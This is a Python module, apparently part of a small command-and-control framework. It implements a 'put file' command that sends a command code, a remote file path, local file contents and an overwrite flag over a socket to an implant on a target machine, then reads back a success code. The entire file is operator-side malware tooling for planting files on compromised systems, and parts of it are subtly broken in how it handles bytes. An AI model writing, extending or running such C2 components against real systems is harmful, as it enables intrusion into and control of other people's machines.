# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with put file functionality 

# NOTE:
    # This is a hack to force our socket to send parameters as separate packets LOL... otherwise itll get thrown into one packet 
import time 
import random

SUCCESS = 1
FAILURE = 0

# Command value
PUT = 1

# How long we'd like to wait between sends 
WAIT_TIME = random.randrange(1, 5)


'''
Description: 
    Prints usage of putfile for user
Params:
    N/A
Returns
    SUCCESS or FAILURE
'''
def printPutFileHelp():
    print("""Required params: \n
                -filepath - local path to file we are writing \n
                -outputfilepath - remote path we are writing to \nOptional params: \n
                -overwrite - overwrite the file if it already exists (default: false)\n""")
    return SUCCESS


'''
Description:
    Performs put file functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filepath - path to local file to read and get bytes to write
    filename - path to write to on target
    overwrite - whether or not to overwrite the remote file if it already exists
Returns:
    SUCCESS or FAILURE 
'''
def putFile(sock, filepath, filename, overwrite):
    try:
        # First tell our implant we want a PUT file performed
        print("Sending command...")
        sock.send(bytes(str(PUT), "utf-8") + b'\x00')
        time.sleep(WAIT_TIME)

        # Open local file and read in our bytes
        with open(filepath, 'r') as openfile:
            filebytes = openfile.read()
            openfile.close()

        # Send filepath to write to 
        print("Sending file path...")
        sock.send(filename + b'\x00')
        time.sleep(WAIT_TIME)

        # Send file bytes
        print("Sending file contents...")
        sock.send(bytes(filebytes, 'utf-8') + b'\x00')
        time.sleep(WAIT_TIME)

        # Send our overwrite
        print("Sending overwrite...")
        sock.send(bytes(overwrite) + b'\x00')
        print("Sent data to implant; waiting on response code...")

        # Wait for response (should be success code)
        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful file put!\n")

        else:
            print("Implant returned FAILURE!\n")


    except Exception as e:
        print("ERROR: Could not send put file to implant: ", e)
        return FAILURE
    
    return SUCCESS